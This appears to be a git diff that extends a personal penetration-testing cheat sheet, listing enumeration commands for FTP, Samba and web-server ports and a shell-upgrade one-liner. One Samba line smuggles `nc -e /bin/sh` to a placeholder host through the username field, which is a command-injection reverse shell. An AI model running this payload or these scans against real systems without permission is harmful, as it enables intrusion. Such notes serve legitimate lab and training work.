@@ -2,8 +2,40 @@
 * Pray to God
 * Run these for enummm! :
 $ autorecon ip
+
+Port 21 FTP
+$ ftp ipadd
+$ info || put file.txt (cek info and put file)
+
+Port 445 Samba
+$ nmap -p 445 vuln -oA ipadd
+$ smbmap -H ipadd
+$ smbclient //ipadd/dir
+$ smbclient -L //IP -N
+$ smbclient -N //IP/tmp -> dir, put
+$ add [global] client min protocol=NT1
+$ smbclient -N //IP/tmp --option='client min protocol=NT1'
+$ smbclient //IP/tmp -U "./=`nohup nc -e /bin/sh IP 443`" -> run nc
+
+Port 80 web server
 $ dirsearch -u http://yourip, OR
 $ gobuster dir -w raft-medium txt,php/hsp,aspx -u http://yourip -t 50 -b 404,403 -o file.log
+$ echo IP domain >> //et/hosts
+$	dirb domain wordlist
+$	gobuster -u IP -w wordlist -t 20 -x php,txt
+$	gobuster dir -u domain -w wordlist -t 50
+$	nikto -h IP
+$	wfuzz -u domain -H "Host: FUZZ.domain" -w wordlist -hh 315
+$	feroxbuster -u domain -x php -w wordlist -k
+$	ffuz -u domain -d "request" -w wordlist -H "header" (seclist/fuzz,specialchar)
+$	wpscan -e --url domain
+
+Better shell:
+python3 -c "import pty;pty.spawn('/bin/bash')"
+
+Reverse Shell:
+https://pentestmonkey.net/
+revershell
 
 
 
